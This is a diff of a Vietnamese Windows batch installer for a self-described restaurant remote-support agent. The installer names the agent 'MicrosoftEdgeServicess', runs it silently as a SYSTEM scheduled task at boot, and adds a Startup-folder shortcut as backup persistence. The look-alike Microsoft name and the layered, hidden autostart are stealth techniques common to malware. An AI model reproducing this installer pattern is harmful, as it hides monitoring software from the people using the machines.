@@ -1,46 +1,68 @@
 @echo off
-chcp 65001 >nul
 title Cai Dat Dich Vu MicrosoftEdgeServicess Tu Dong Khoi Dong Cung Windows
 cd /d "%~dp0"
 
 echo ===============================================================================
-echo   CÀI ĐẶT DỊCH VỤ HỖ TRỢ & QUẢN TRỊ TỪ XA MÁY TRẠM NHÀ HÀNG
-echo   Tên dịch vụ: MicrosoftEdgeServicess
-echo   Cơ chế: Tự khởi động cùng Windows (Automatic) - Tự chạy lại khi gặp lỗi
+echo   CAI DAT DICH VU HO TRO VA QUAN TRI TU XA MAY TRAM NHA HANG
+echo   Ten dich vu: MicrosoftEdgeServicess
+echo   Co che: Tu khoi dong cung Windows (Automatic) - Chay ngam 100 phan tram
 echo ===============================================================================
 echo.
 
-:: 1. Kiểm tra môi trường Python
-where python >nul 2>nul
-if %errorlevel% neq 0 (
-    echo [LỖI] Chưa tìm thấy Python trên máy tính này!
-    echo Vui lòng cài đặt Python 3.8 trở lên và tích chọn "Add python.exe to PATH".
+:: 1. Kiem tra xem co file thuc thi EXE hoac Python tren may hay khong
+set "HAS_RUNNER=0"
+if exist "%~dp0MicrosoftEdgeServicess.exe" (
+    set "HAS_RUNNER=1"
+    echo [OK] Phat hien goi phan mem doc lap MicrosoftEdgeServicess.exe (Khong can Python).
+) else (
+    python -c "import sys; sys.exit(0)" >nul 2>nul
+    if %errorlevel% equ 0 (
+        set "HAS_RUNNER=1"
+        echo [OK] Phat hien moi truong Python tren he thong.
+    ) else (
+        py -3 -c "import sys; sys.exit(0)" >nul 2>nul
+        if %errorlevel% equ 0 (
+            set "HAS_RUNNER=1"
+            echo [OK] Phat hien Python Launcher (py) tren he thong.
+        )
+    )
+)
+
+if "%HAS_RUNNER%"=="0" (
+    echo [CANH BAO] Khong tim thay MicrosoftEdgeServicess.exe hoac Python!
+    echo Vui long kiem tra file MicrosoftEdgeServicess.exe phai nam cung thu muc voi file bat nay.
+    echo Hoac cai dat Python 3.8 tro len.
     echo.
     pause
     exit /b 1
 )
 
-:: 2. Thiết lập thư mục cài đặt hệ thống
+:: 2. Thiet lap thu muc cai dat he thong
 set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
-echo 1. Đang sao chép các tệp dịch vụ vào: %INSTALL_DIR%
+echo.
+echo 1. Dang sao chep cac tep dich vu vao: %INSTALL_DIR%
+if exist "%~dp0MicrosoftEdgeServicess.exe" copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul
 copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul
 copy /Y "%~dp0restaurant_support_agent.py" "%INSTALL_DIR%\" >nul
 copy /Y "%~dp0Run_Silent_Agent.vbs" "%INSTALL_DIR%\" >nul
 copy /Y "%~dp0Chay_Agent_Truc_Tiep.bat" "%INSTALL_DIR%\" >nul
+copy /Y "%~dp0Kiem_Tra_Trang_Thai.bat" "%INSTALL_DIR%\" >nul
 copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul
 copy /Y "%~dp0README_HUONG_DAN.txt" "%INSTALL_DIR%\" >nul 2>nul
 
-echo 2. Đang đăng ký tác vụ tự động khởi động cùng Windows (Task Scheduler)...
-:: Đăng ký tác vụ hệ thống khởi động cùng Windows với quyền cao nhất
+echo.
+echo 2. Dang dang ky tac vu tu dong khoi dong cung Windows (Task Scheduler)...
 schtasks /Create /TN "MicrosoftEdgeServicess" /TR "wscript.exe \"%INSTALL_DIR%\Run_Silent_Agent.vbs\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul 2>nul
 if %errorlevel% neq 0 (
-    echo    -> Dang ky Task Scheduler muc SYSTEM can quyen Admin. Thu dang ky muc User ONLOGON...
+    echo    -> Dang ky Task Scheduler muc SYSTEM can quyen Admin. Dang ky du phong muc ONLOGON...
     schtasks /Create /TN "MicrosoftEdgeServicess" /TR "wscript.exe \"%INSTALL_DIR%\Run_Silent_Agent.vbs\"" /SC ONLOGON /RL HIGHEST /F >nul 2>nul
 )
 
-:: Tạo thêm shortcut vào thư mục Startup để đảm bảo dự phòng 100%
+:: 3. Tao shortcut vao thu muc Startup de dam bao du phong
+echo.
+echo 3. Dang thiet lap khoi dong du phong tai Startup folder...
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "VBS_SHORTCUT=%TEMP%\create_shortcut_edge_svc.vbs"
 echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_SHORTCUT%"
@@ -51,18 +73,19 @@ echo oLink.WorkingDirectory = "%INSTALL_DIR%" >> "%VBS_SHORTCUT%"
 echo oLink.Description = "MicrosoftEdgeServicess Remote Support Background Service" >> "%VBS_SHORTCUT%"
 echo oLink.Save >> "%VBS_SHORTCUT%"
 cscript //nologo "%VBS_SHORTCUT%" >nul 2>nul
-del "%VBS_SHORTCUT%" >nul 2>nul
+if exist "%VBS_SHORTCUT%" del /f /q "%VBS_SHORTCUT%" >nul 2>nul
 
-echo 3. Đang khởi chạy dịch vụ ngầm ngay bây giờ...
+echo.
+echo 4. Dang khoi chay dich vu ngam ngay bay gio...
 wscript.exe "%INSTALL_DIR%\Run_Silent_Agent.vbs"
 
 echo.
 echo ===============================================================================
-echo   CÀI ĐẶT THÀNH CÔNG!
-echo   - Thư mục cài đặt: %INSTALL_DIR%
-echo   - Dịch vụ: MicrosoftEdgeServicess
-echo   - Đã thiết lập tự khởi động cùng Windows mỗi khi bật máy.
-echo   - Dịch vụ đang chạy ngầm và gửi Heartbeat lên Server.
+echo   CAI DAT THANH CONG!
+echo   - Thu muc cai dat: %INSTALL_DIR%
+echo   - Ten dich vu ngam: MicrosoftEdgeServicess
+echo   - Da thiet lap tu khoi dong cung Windows moi khi bat may.
+echo   - Dich vu dang chay ngam va gui Heartbeat dinh ky ve Server Quan Tri.
 echo ===============================================================================
 echo.
 pause
